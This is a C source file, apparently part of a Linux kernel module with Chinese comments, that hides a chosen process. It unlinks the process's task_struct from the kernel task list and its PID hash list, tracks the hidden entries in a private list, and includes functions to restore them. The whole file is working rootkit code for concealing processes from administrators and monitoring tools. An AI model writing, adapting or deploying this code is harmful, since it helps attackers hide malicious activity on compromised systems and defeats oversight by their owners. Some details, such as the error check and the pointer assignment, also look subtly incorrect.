#include "hide_pid.h"

int hide_pid_fn(pid_t pid_victim){
    struct pid *pid_use=find_vpid(pid_victim);
    if(IS_ERR(pid_use))
    {
        printk("hide %d process error: pid_err\n",pid_victim);
        return -1;
    }
    else{
        struct task_struct* task_use=pid_task(pid_use,PIDTYPE_PID);//找到对应的task sturct
        //从task_struct列表进行移除
		list_del_rcu(&task_use->tasks);//从task上进行脱链
        INIT_LIST_HEAD(&task_use->tasks);//把head prev指针指向自身

		struct hlist_node *node_use=&task_use->pid_links[PIDTYPE_PID];//找node
		//从pid列表移除
		hlist_del_rcu(node_use);//把node从pid list脱链
        INIT_HLIST_NODE(node_use);//设置node的next，pprev指针为空
        node_use->pprev = &node_use;//pprev指向自身
		printk("Hide %d process success!\n",pid_victim);
		//使用hide_node结点存储task和node，并加到hide_list链表上
		struct hide_node *hide_n=kmalloc(sizeof(struct hide_node),GFP_KERNEL);//申请空间存储hide node
		hide_n->pid_victim_t=pid_victim;//设置pid
		hide_n->task_use_t=task_use;//设置task
		list_add(&hide_n->hide_list_header_t,&hide_list_header);//把hide_node结点增加到hide_list_header上		
		printk("Add hide_node %d to list success!\n",pid_victim);
    }
	return 0;
}

int recover_pid_fn(pid_t pid_victim){
	struct hide_node *pos=NULL,*pos_n=NULL;
	list_for_each_entry_safe(pos,pos_n,&hide_list_header,hide_list_header_t){
		if(pos->pid_victim_t==pid_victim){
			struct task_struct* task_use=pos->task_use_t;
			hlist_add_head_rcu(&task_use->pid_links[PIDTYPE_PID], &task_use->thread_pid->tasks[PIDTYPE_PID]);//增加到pid list
    		list_add_tail_rcu(&task_use->tasks, &init_task.tasks);//增加到init_task链表
			list_del(&pos->hide_list_header_t);//把hide node从hide_list_header_t链表中摘除
			kfree(pos);//释放hide node占用的空间
			printk("Recover hide_node %d success!\n",pid_victim);
		}
	}
	return 0;
}

int recover_pid_all(void){
	struct hide_node *pos=NULL,*pos_n=NULL;
	list_for_each_entry_safe(pos,pos_n,&hide_list_header,hide_list_header_t){
		struct task_struct* task_use=pos->task_use_t;
		hlist_add_head_rcu(&task_use->pid_links[PIDTYPE_PID], &task_use->thread_pid->tasks[PIDTYPE_PID]);//增加到pid list
    	list_add_tail_rcu(&task_use->tasks, &init_task.tasks);//增加到init_task链表
		list_del(&pos->hide_list_header_t);//把hide node从hide_list_header_t链表中摘除
		kfree(pos);//释放hide node占用的空间
		printk("Recover all hide_node success!\n");
	}
	return 0;
}